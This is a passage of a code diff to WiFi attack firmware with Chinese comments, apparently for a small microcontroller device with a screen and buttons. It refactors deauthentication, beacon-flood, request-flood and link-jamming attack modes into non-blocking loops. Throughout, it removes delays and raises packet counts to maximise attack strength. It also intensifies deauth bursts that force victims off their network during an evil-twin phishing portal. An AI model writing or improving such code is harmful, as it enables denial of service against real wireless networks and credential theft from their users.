+      break; // 每次只处理一个目标
+    }
+  }
+}
+
+// 兼容包装器：保持原函数签名
+void AutoSingle() {
+  startAutoSingleAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processAutoSingleAttack();
+  }
+}
+// 启动自动多重攻击
+void startAutoMultiAttack() {
+  g_deauthState.mode = ATTACK_AUTO_MULTI;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.lastScanMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = 5; // 自动多重攻击使用中等批次
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 120;
+  g_deauthState.ledBlinkInterval = 600;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
+  
+  // 初始化目标列表
   if (smartTargets.empty() && !SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
         TargetInfo target;
         memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
         target.channel = scan_results[selectedIndex].channel;
@@ -4140,276 +4419,241 @@ void AutoMulti() {
         smartTargets.push_back(target);
       }
     }
-    lastScanTime = millis();
+    g_deauthState.lastScanMs = millis();
   }
-  while (true) {
-    // 更新攻击状态显示
+  
+  Serial.println("=== 启动自动多重攻击（非阻塞） ===");
+  showAttackStatusPage("自动多重攻击中");
+  startAttackLED();
+}
+
+// 处理自动多重攻击
+void processAutoMultiAttack() {
+  unsigned long now = millis();
+  
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+      if (showConfirmModal("确认停止攻击")) {
+        stopAttack();
+        return;
+      }
+      startAttackLED();
+      showAttackStatusPage("自动多重攻击中");
+    }
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
     showAttackStatusPage("自动多重攻击中");
-
-    unsigned long currentTime = millis();
-    if (currentTime - prevBlink >= blinkInterval) {
-      redState = !redState;
-      digitalWrite(LED_R, redState ? HIGH : LOW);
-      prevBlink = currentTime;
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 定期扫描更新（每10分钟）
+  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
+    std::vector<WiFiScanResult> backup = scan_results;
+    updateSmartTargets();
+    if (scan_results.empty()) {
+      scan_results = std::move(backup);
     }
-    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
-      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-        digitalWrite(LED_R, LOW);
-        digitalWrite(LED_G, LOW);
-        digitalWrite(LED_B, LOW);
-        delay(200);
-        // 显示确认弹窗
-        if (showConfirmModal("确认停止攻击")) {
-          return; // 确认停止攻击
-        }
-        // 取消则继续攻击，重新启动LED
-        startAttackLED();
-      }
-      buttonCheckTime = currentTime;
+    g_deauthState.lastScanMs = now;
+  }
+  
+  // 攻击目标（轮询方式）
+  if (!smartTargets.empty()) {
+    // 跳过非活跃目标
+    while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
+      g_deauthState.currentTargetIndex++;
     }
-    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
-      std::vector<WiFiScanResult> backup = scan_results;
-      updateSmartTargets();
-      if (scan_results.empty()) {
-        scan_results = std::move(backup);
+    if (g_deauthState.currentTargetIndex >= smartTargets.size()) {
+      g_deauthState.currentTargetIndex = 0;
+      // 再次跳过非活跃目标
+      while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
+        g_deauthState.currentTargetIndex++;
       }
-      lastScanTime = currentTime;
     }
-    int packetCount = 0;
-    if (!smartTargets.empty()) {
-      // 跳过非活跃目标
-      while (currentTargetIndex < smartTargets.size() && !smartTargets[currentTargetIndex].active) {
-        currentTargetIndex++;
-      }
-      if (currentTargetIndex >= smartTargets.size()) {
-        currentTargetIndex = 0;
-        // 再次跳过非活跃目标
-        while (currentTargetIndex < smartTargets.size() && !smartTargets[currentTargetIndex].active) {
-          currentTargetIndex++;
-        }
-      }
+    
+    if (g_deauthState.currentTargetIndex < smartTargets.size()) {
+      const auto& target = smartTargets[g_deauthState.currentTargetIndex];
+      setChannelOptimized(target.channel);
+      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
       
-      if (currentTargetIndex < smartTargets.size()) {
-        const auto& target = smartTargets[currentTargetIndex];
-        wext_set_channel(WLAN0_NAME, target.channel);
-        sendFixedReasonDeauthBurst(target.bssid, 0, 5, packetCount, 5);
-        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
-          digitalWrite(LED_R, HIGH);
-          delay(50);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
-        currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
+      // LED反馈
+      if (g_deauthState.packetCount >= 100) {
+        digitalWrite(LED_R, HIGH);
+        delay(5); // 减少LED反馈延时，提高攻击效率
+        digitalWrite(LED_R, LOW);
+        g_deauthState.packetCount = 0;
       }
+      g_deauthState.currentTargetIndex = (g_deauthState.currentTargetIndex + 1) % smartTargets.size();
     }
-    // 优化：减少无效延时
-    // delay(10); // 可根据实际情况调整或去除
   }
 }
-void All() {
-  Serial.println("=== 启动全频道攻击 ===");
-  Serial.println("攻击模式: 全频道攻击");
-  Serial.println("攻击强度: " + String(perdeauth));
+
+// 启动全频道攻击
+void startAllAttack() {
+  g_deauthState.mode = ATTACK_ALL;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = perdeauth;
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 100;
+  g_deauthState.ledBlinkInterval = 500;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
   
+  // 为所有网络创建目标（如果还没有创建）
+  if (smartTargets.empty()) {
+    for (size_t i = 0; i < scan_results.size(); i++) {
+      TargetInfo target;
+      memcpy(target.bssid, scan_results[i].bssid, 6);
+      target.channel = scan_results[i].channel;
+      target.active = true;
+      smartTargets.push_back(target);
+    }
+  }
+  
+  // 预处理目标列表
+  channelBucketsCache.clearBuckets();
+  for (const auto &t : smartTargets) {
+    if (t.active) {
+      channelBucketsCache.add(t.channel, t.bssid);
+    }
+  }
+  g_deauthState.currentChannelBucketIndex = 0;
+  g_deauthState.currentBssidIndexInBucket = 0;
+  
+  // 根据目标数量动态调整参数
+  int targetCount = smartTargets.size();
+  if (targetCount > 10) {
+    g_deauthState.packetsPerCycle = perdeauth * 2; // 大量目标时增加批次
+  } else {
+    g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
+  }
+  
+  Serial.println("=== 启动全频道攻击（非阻塞） ===");
+  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
   showAttackStatusPage("全频道攻击中");
-  
-  // LED控制：红灯闪烁
   startAttackLED();
+}
+
+// 处理全频道攻击
+void processAllAttack() {
+  unsigned long now = millis();
   
-  while (true) {
-    // 更新攻击状态显示
-    showAttackStatusPage("全频道攻击中");
-    
-    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      delay(200);
-      // 显示确认弹窗
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
       if (showConfirmModal("确认停止攻击")) {
-        return; // 确认停止攻击
+        stopAttack();
+        return;
       }
-      // 取消则继续攻击，重新启动LED
       startAttackLED();
+      showAttackStatusPage("全频道攻击中");
     }
-    
-    // 为所有网络创建目标（如果还没有创建）
-    if (smartTargets.empty()) {
-      for (size_t i = 0; i < scan_results.size(); i++) {
-        TargetInfo target;
-        memcpy(target.bssid, scan_results[i].bssid, 6);
-        target.channel = scan_results[i].channel;
-        target.active = true;
-        smartTargets.push_back(target);
-      }
-    }
-    
-    // 按信道分组，减少频繁切换信道
-    channelBucketsCache.clearBuckets();
-    for (const auto &t : smartTargets) {
-      if (t.active) {  // 只攻击活跃目标
-        channelBucketsCache.add(t.channel, t.bssid);
-      }
-    }
-    
-    int packetCount = 0;
-    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
-      if (channelBucketsCache.buckets[chIdx].empty()) continue;
-      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
-      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
-        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-          digitalWrite(LED_R, LOW);
-          digitalWrite(LED_G, LOW);
-          digitalWrite(LED_B, LOW);
-          delay(200);
-          // 显示确认弹窗
-          if (showConfirmModal("确认停止攻击")) {
-            return; // 确认停止攻击
-          }
-          // 取消则继续攻击，重新启动LED
-          startAttackLED();
-        }
-        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
-        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
-          digitalWrite(LED_R, HIGH);
-          delay(50);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
-      }
-    }
-    // extras信道处理
-    for (const auto &eb : channelBucketsCache.extras) {
-      if (eb.bssids.empty()) continue;
-      wext_set_channel(WLAN0_NAME, eb.channel);
-      for (const uint8_t *bssidPtr : eb.bssids) {
-        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-          digitalWrite(LED_R, LOW);
-          digitalWrite(LED_G, LOW);
-          digitalWrite(LED_B, LOW);
-          delay(200);
-          // 显示确认弹窗
-          if (showConfirmModal("确认停止攻击")) {
-            return; // 确认停止攻击
-          }
-          // 取消则继续攻击，重新启动LED
-          startAttackLED();
-        }
-        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
-        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
-          digitalWrite(LED_R, HIGH);
-          delay(50);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
-      }
-    }
-    
-    delay(10); // 短暂延时避免CPU过载
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+    showAttackStatusPage("全频道攻击中");
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 使用增强版信道桶处理所有目标
+  processChannelBucketsEnhanced();
+  
+  // LED反馈
+  if (g_deauthState.packetCount >= 100) {
+    digitalWrite(LED_R, HIGH);
+    delay(5); // 减少LED反馈延时，提高攻击效率
+    digitalWrite(LED_R, LOW);
+    g_deauthState.packetCount = 0;
   }
 }
 
-
-void BeaconDeauth() {
-  Serial.println("=== 启动信标+解除认证攻击 ===");
-  Serial.println("攻击模式: 信标+解除认证攻击");
-  Serial.println("攻击强度: 10");
+// 启动信标+解除认证攻击
+void startBeaconDeauthAttack() {
+  g_deauthState.mode = ATTACK_BEACON_DEAUTH;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = 1; // 信标攻击使用小批次
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 100;
+  g_deauthState.ledBlinkInterval = 800;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
   
-  display.clearDisplay();
-  display.setTextColor(SSD1306_WHITE);
-  display.setTextSize(1);
-  
-  u8g2_for_adafruit_gfx.setFontMode(1);
-  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-  oledDrawCenteredLine("信标+解除认证攻击中", 25);
-  
-  // LED控制：红灯闪烁
+  Serial.println("=== 启动信标+解除认证攻击（非阻塞） ===");
+  showAttackStatusPage("信标+解除认证攻击中");
   startAttackLED();
+}
 
-  unsigned long prevBlink = 0;
-  bool redState = true;
-  const int blinkInterval = 800;
-
-  // OLED行区域：显示目标SSID，单目标仅显示一次，多目标1s刷新
-  const int ssidLineY = 42;
-  static unsigned long lastSSIDDrawMs = 0;
-  bool singleTargetDrawn = false;
-
-  int packetCount = 0;
-  while (true) {
-    unsigned long now = millis();
-    
-    if (now - prevBlink >= blinkInterval) {
-      redState = !redState;
-      digitalWrite(LED_R, redState ? HIGH : LOW);
-      prevBlink = now;
-    }
-    
-    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      delay(200);
-      // 显示确认弹窗
+// 处理信标+解除认证攻击
+void processBeaconDeauthAttack() {
+  unsigned long now = millis();
+  
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
       if (showConfirmModal("确认停止攻击")) {
-        return; // 确认停止攻击
+        stopAttack();
+        return;
       }
-      // 取消则继续攻击，重新启动LED
       startAttackLED();
-      // 重新绘制攻击状态页面，避免确认弹窗残留
-      display.clearDisplay();
-      u8g2_for_adafruit_gfx.setFontMode(1);
-      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
-      oledDrawCenteredLine("信标+解除认证攻击中", 25);
+      showAttackStatusPage("信标+解除认证攻击中");
     }
-
-    if (!SelectedVector.empty()) {
-      // 单目标：仅绘制一次；多目标：1s刷新
-      unsigned long intervalMs = (SelectedVector.size() > 1) ? 1000UL : 0UL;
-      for (int selectedIndex : SelectedVector) {
-        if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
-          String ssid1 = scan_results[selectedIndex].ssid;
-          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
-          
-          // 克隆多个BSSID的同名信标
-          const int cloneCount = 6;
-          uint8_t tempMac[6];
-          for (int c = 0; c < cloneCount; c++) {
-            generateRandomMAC(tempMac);
-            for (int x = 0; x < 10; x++) {
-              wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, ssid1.c_str());
-            }
-          }
-          
-          // 使用原因码 1/4/16 组合，小批量，帧间隔 5ms
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, packetCount, 5);
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, packetCount, 5);
-          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, packetCount, 5);
-          if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
-            digitalWrite(LED_R, HIGH);
-            delay(50);
-            digitalWrite(LED_R, LOW);
-            packetCount = 0;
-          }
-
-          // 单目标仅绘制一次；多目标定时刷新
-          if (SelectedVector.size() == 1) {
-            if (!singleTargetDrawn) {
-              oledDrawCenteredLine(ssid1.c_str(), ssidLineY);
-              singleTargetDrawn = true;
-            }
-          } else {
-            oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
-          }
-        }
-      }
-    } else {
-      // 如果没有选择特定SSID，攻击所有扫描到的网络（视为多目标，1s刷新）
-      const unsigned long intervalMs = 1000UL;
-      for (size_t i = 0; i < scan_results.size(); i++) {
-        String ssid1 = scan_results[i].ssid;
-        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+    showAttackStatusPage("信标+解除认证攻击中");
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 简化的信标+解除认证攻击逻辑
+  if (!SelectedVector.empty()) {
+    for (int selectedIndex : SelectedVector) {
+      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
+        String ssid1 = scan_results[selectedIndex].ssid;
+        setChannelOptimized(scan_results[selectedIndex].channel);
         
+        // 发送信标帧
         const int cloneCount = 6;
         uint8_t tempMac[6];
         for (int c = 0; c < cloneCount; c++) {
@@ -4419,20 +4663,54 @@ void BeaconDeauth() {
           }
         }
         
-        // 对齐示例：使用原因码 1/4/16 组合，小批量，帧间隔 5ms
-        sendFixedReasonDeauthBurst(scan_results[i].bssid, 1, 1, packetCount, 5);
-        sendFixedReasonDeauthBurst(scan_results[i].bssid, 4, 1, packetCount, 5);
-        sendFixedReasonDeauthBurst(scan_results[i].bssid, 16, 1, packetCount, 5);
-        if (packetCount >= 100) {
-          digitalWrite(LED_R, HIGH);
-          delay(50);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
+        // 发送增强版解除认证帧
+        if (g_enhancedDeauthMode) {
+          sendDeauthBatchEnhanced(scan_results[selectedIndex].bssid, 
+                                  g_deauthState.packetsPerCycle, 
+                                  g_deauthState.packetCount);
+        } else {
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 1, 1, g_deauthState.packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 4, 1, g_deauthState.packetCount, 5);
+          sendFixedReasonDeauthBurst(scan_results[selectedIndex].bssid, 16, 1, g_deauthState.packetCount, 5);
         }
-
-        oledMaybeDrawCenteredLine(ssid1.c_str(), ssidLineY, lastSSIDDrawMs, intervalMs);
+        
+        // LED反馈
+        if (g_deauthState.packetCount >= 100) {
+          digitalWrite(LED_R, HIGH);
+          delay(10);
+          digitalWrite(LED_R, LOW);
+          g_deauthState.packetCount = 0;
+        }
+        break; // 每次只处理一个目标
       }
     }
+  }
+}
+
+// 兼容包装器：保持原函数签名
+void AutoMulti() {
+  startAutoMultiAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processAutoMultiAttack();
+  }
+}
+// 兼容包装器：保持原函数签名
+void All() {
+  startAllAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processAllAttack();
+  }
+}
+
+
+// 兼容包装器：保持原函数签名
+void BeaconDeauth() {
+  startBeaconDeauthAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processBeaconDeauthAttack();
   }
 }
 void generateRandomMAC(uint8_t* mac) {
@@ -4576,11 +4854,11 @@ void RequestFlood() {
       arflen = wifi_build_auth_req(staMac, (void*)target.bssid, arf);
       asflen = wifi_build_assoc_req(staMac, (void*)target.bssid, target.ssid.c_str(), asf);
 
-      // 突发：先多次认证，再多次关联，最大化解析概率
-      for (int i = 0; i < 10; i++) { wifi_tx_raw_frame(&arf, arflen); }
-      for (int i = 0; i < 8; i++) { wifi_tx_raw_frame(&asf, asflen); }
+      // 突发：大幅增加发包数量，提高攻击强度
+      for (int i = 0; i < 20; i++) { wifi_tx_raw_frame(&arf, arflen); }
+      for (int i = 0; i < 25; i++) { wifi_tx_raw_frame(&asf, asflen); }
       
-      delay(2); // 目标间微小延时
+      // 移除目标间延时，提高攻击效率
     }
   }
 }
@@ -4677,18 +4955,16 @@ void LinkJammer() {
       
       // 对每个目标发送帧，按信道分组优化效率
       for (const auto& target : targets) {
-        // 降低突发发送速率，防止设备过载
-        for (int i = 0; i < 7; i++) {
+        // 大幅提高突发发送速率，最大化攻击效果
+        for (int i = 0; i < 25; i++) {
           wifi_tx_raw_frame((void*)&target.bf, target.blen);
-          delay(1); // 微小延时防止过载
         }
-        for (int i = 0; i < 10; i++) {
+        for (int i = 0; i < 30; i++) {
           wifi_tx_raw_frame((void*)&target.prf, target.prlen);
-          delay(1); // 微小延时防止过载
         }
-        delay(1); // 目标间微小延时
+        // 移除目标间延时，提高攻击效率
       }
-      delay(3); // 信道间延时
+      // 移除信道间延时，实现最高攻击速率
     }
   }
 }
@@ -4752,7 +5028,7 @@ void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool 
       for (int fiveGCh : fiveGChannels) {
         sendBeaconOnChannel(fiveGCh, ssid.c_str(), 
                            config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        if (isStableMode) delay(5); // 减少信道间延时，提高攻击效率
       }
     }
   } else if (is5GChannel(originalChannel)) {
@@ -4770,7 +5046,7 @@ void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool 
       for (int two4GCh : two4GChannels) {
         sendBeaconOnChannel(two4GCh, ssid.c_str(), 
                            config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        if (isStableMode) delay(5); // 减少信道间延时，提高攻击效率
       }
     }
   }
@@ -4810,7 +5086,7 @@ void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bo
       for (int fiveGCh : fiveGChannels) {
         sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(), 
                                config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        if (isStableMode) delay(3); // 进一步减少信道间延时，最大化攻击效率
       }
     }
   } else if (is5GChannel(originalChannel)) {
@@ -4828,7 +5104,7 @@ void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bo
       for (int two4GCh : two4GChannels) {
         sendBeaconOnChannelWeb(two4GCh, ssid.c_str(), 
                                config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        if (isStableMode) delay(3); // 进一步减少信道间延时，最大化攻击效率
       }
     }
   }
@@ -5346,7 +5622,7 @@ void StableAutoMulti() {
   }
 
   // 配置：每个BSSID一次 burst = perdeauth 轮，帧间延时细微节拍
-  const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
+  const unsigned int interFrameDelayUs = 100;  // 减少帧间延时，从250微秒改为100微秒，提高攻击强度
 
   while (true) {
     // 更新攻击状态显示
@@ -6001,6 +6277,33 @@ void loop() {
   // 更新LED状态
   updateLEDs();
   
+  // 处理非阻塞攻击
+  if (g_deauthState.running) {
+    switch (g_deauthState.mode) {
+      case ATTACK_SINGLE:
+        processSingleAttack();
+        break;
+      case ATTACK_MULTI:
+        processMultiAttack();
+        break;
+      case ATTACK_AUTO_SINGLE:
+        processAutoSingleAttack();
+        break;
+      case ATTACK_AUTO_MULTI:
+        processAutoMultiAttack();
+        break;
+      case ATTACK_ALL:
+        processAllAttack();
+        break;
+      case ATTACK_BEACON_DEAUTH:
+        processBeaconDeauthAttack();
+        break;
+      default:
+        break;
+    }
+    return; // 攻击运行时优先处理攻击逻辑
+  }
+  
   static unsigned long lastCheck = 0;
   if (currentTime - lastCheck > 30000) {
     char t[16]; unsigned int n = 0;
@@ -6321,8 +6624,14 @@ bool startWebTest() {
     lastPhishingBroadcastMs = nowInit;
     if (phishingHasTarget) {
       int dummy = 0;
-      // 预突发：使用与稳定自动多重攻击相同的发包逻辑
-      sendDeauthBurstToBssidUs(phishingTargetBSSID, 5, dummy, 250);
+      // 预突发：大幅增强攻击强度
+      if (g_enhancedDeauthMode) {
+        // 增强版：15批 * 6帧 = 90帧
+        sendDeauthBatchEnhanced(phishingTargetBSSID, 15, dummy);
+      } else {
+        // 兼容模式：10批 * 3帧 = 30帧
+        sendDeauthBurstToBssidUs(phishingTargetBSSID, 10, dummy, 250);
+      }
     }
     return true;
   } else {
@@ -7289,22 +7598,48 @@ void handleWebTest() {
     lastOkTime = currentTime;
   }
 
-  // 钓鱼期间：周期性发送去认证诱发（与稳定自动多重攻击相同的发包逻辑）
-  // 使用与稳定自动多重攻击完全相同的发包逻辑：sendDeauthBurstToBssidUs函数
-  // 按DEAUTH_REASONS[3] = {1, 4, 16}顺序循环发送，帧间隔250微秒
+  // 钓鱼期间：周期性发送去认证诱发（增强版发包逻辑）
+  // 使用增强版批量发送：支持双向攻击和更多原因码
   if (phishingHasTarget) {
     unsigned long now = millis();
-    if (now - lastPhishingDeauthMs >= 500UL) {
+    
+    // 动态调整间隔和批次数：大幅增加攻击强度
+    if (web_test_active && web_client.connected()) {
+      phishingDeauthInterval = 800; // 有客户端时降低频率
+      phishingBatchSize = 2; // 有客户端时减少但保持较高强度
+    } else {
+      phishingDeauthInterval = 180;  // 无客户端时保持高频
+      phishingBatchSize = 6; // 无客户端时最大强度
+    }
+    
+    if (now - lastPhishingDeauthMs >= phishingDeauthInterval) {
       int dummyCount = 0;
-      // 使用与稳定自动多重攻击相同的发包逻辑
-      sendDeauthBurstToBssidUs(phishingTargetBSSID, 3, dummyCount, 250);
+      // 使用增强版批量发送：双向攻击，更强效果
+      if (g_enhancedDeauthMode) {
+        // 增强版：动态批次数 * 6帧
+        sendDeauthBatchEnhanced(phishingTargetBSSID, phishingBatchSize, dummyCount);
+      } else {
+        // 兼容模式：使用原有发包逻辑
+        sendDeauthBurstToBssidUs(phishingTargetBSSID, phishingBatchSize, dummyCount, 250);
+      }
       lastPhishingDeauthMs = now;
     }
     if (now - lastPhishingBroadcastMs >= 1000UL) {
-      // 广播去认证与解除关联（轻量），与handshake.h逻辑保持一致
-      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
-      wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
-      wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
+      // 增强广播：使用更多原因码，大幅增加发送次数
+      if (g_enhancedDeauthMode) {
+        // 增强版广播：6种原因码，每个发送5次
+        const uint16_t broadcastReasons[] = {1, 4, 7, 8, 15, 16};
+        for (int i = 0; i < 6; i++) {
+          wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, broadcastReasons[i], 5, 200);
+        }
+        // 解关联也增加到5次
+        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 5, 200);
+      } else {
+        // 兼容模式：使用原有广播逻辑
+        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
+        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
+        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
+      }
       lastPhishingBroadcastMs = now;
     }
   }
@@ -8803,3 +9138,4 @@ void displayWebServiceStatus() {
   
   display.display();
 }
+
